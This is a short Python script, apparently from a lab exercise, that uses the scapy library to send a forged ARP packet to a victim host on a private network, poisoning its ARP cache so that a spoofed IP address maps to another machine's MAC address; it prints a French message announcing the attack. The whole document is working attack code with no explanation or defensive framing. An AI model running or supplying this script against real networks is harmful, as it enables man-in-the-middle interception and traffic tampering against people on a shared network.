# "10.33.77.14"

from scapy.all import *

victim_ip = "192.168.56.45" 
victim_mac = "08:00:27:d2:0a:fe"  

spoofed_ip = "192.168.56.148"  
spoofed_mac = "b0:dc:ef:bb:ff:9e"

def arp_poison(victim_ip, victim_mac, spoofed_ip, spoofed_mac):

    arp = ARP(op="who-has", pdst=victim_ip, hwdst=victim_mac, psrc=spoofed_ip, hwsrc=spoofed_mac) 
    print(f"Attaque en cours sur {victim_ip}...")
    send(arp, verbose=False)  

arp_poison(victim_ip, victim_mac, spoofed_ip, spoofed_mac)
